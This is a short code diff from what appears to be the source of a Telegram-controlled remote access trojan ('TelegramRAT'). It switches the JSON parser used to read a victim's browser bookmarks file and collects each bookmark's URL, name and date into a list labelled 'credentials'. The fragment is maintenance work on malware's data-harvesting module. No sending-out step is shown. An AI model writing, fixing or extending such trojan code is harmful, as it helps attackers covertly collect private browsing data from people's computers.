@@ -53,13 +53,13 @@ namespace TelegramRAT
 
 
                 string bookmarksFile = File.ReadAllText(browser);
-                foreach (var mark in Newtonsoft.Json.Linq.JObject.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
+                foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                 {
                     Dictionary<string, string> credentials = new Dictionary<string, string>
                     {
-                        ["url"] = (string)mark["url"],
-                        ["name"] = (string)mark["name"],
-                        ["date_added"] = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(mark["date_added"])), TimeZoneInfo.Local))
+                        ["url"] = mark["url"],
+                        ["name"] = mark["name"],
+                        ["date_added"] = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local))
                     };
                     bookmarks.Add(credentials);
                 }
